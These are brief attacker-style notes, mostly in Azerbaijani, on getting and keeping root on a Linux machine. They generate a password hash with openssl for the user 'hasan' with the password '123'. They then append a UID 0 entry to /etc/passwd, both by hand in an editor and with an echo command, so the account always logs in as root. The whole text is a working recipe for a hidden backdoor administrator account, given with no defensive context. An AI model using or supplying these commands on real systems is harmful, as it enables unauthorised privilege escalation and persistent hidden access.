    nano  /etc/passwd  
 ## hissesine elave etsen sen hemise root kimi usere daxil olacaqsan 
      openssl passwd -1  -salt hasan
   ## parol 123
       nano /etc/passwd
       
    hasan:$1$hasan$BUMdh4tI4WdCuFkBJI64T/:0:0:root:/root:/bin/bash
   
 


  
   ## sen artiq ROOT'SAN
# The working mechanism of this is very similar to crontab
echo "hasan:$1$hasan$BUMdh4tI4WdCuFkBJI64T/:0:0:root:/root:/bin/bash
" >> /etc/passwd
